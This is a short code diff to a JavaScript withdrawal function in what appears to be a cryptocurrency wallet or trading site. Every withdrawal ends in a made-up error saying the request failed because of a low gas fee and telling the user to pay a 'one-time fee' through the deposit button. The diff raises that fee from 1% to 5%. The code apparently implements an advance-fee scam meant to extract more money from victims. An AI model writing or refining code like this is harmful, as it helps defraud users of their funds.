@@ -224,7 +224,7 @@ function withdraw() {
   localStorage.setItem("transactions", JSON.stringify(transactions));
 
   messageEl.style.color = "#fc0f03";
-  messageEl.innerText = `Withdrawal request of ${amount} ${crypto} is not processed due to low gas fee, kindly deposit a 1% one-time fee through the deposit button.`;
+  messageEl.innerText = `Withdrawal request of ${amount} ${crypto} is not processed due to low withdrawal gas fee, kindly deposit a 5% one-time fee through the deposit button.`;
 
   document.getElementById("address").value = "";
   document.getElementById("amount").value = "";
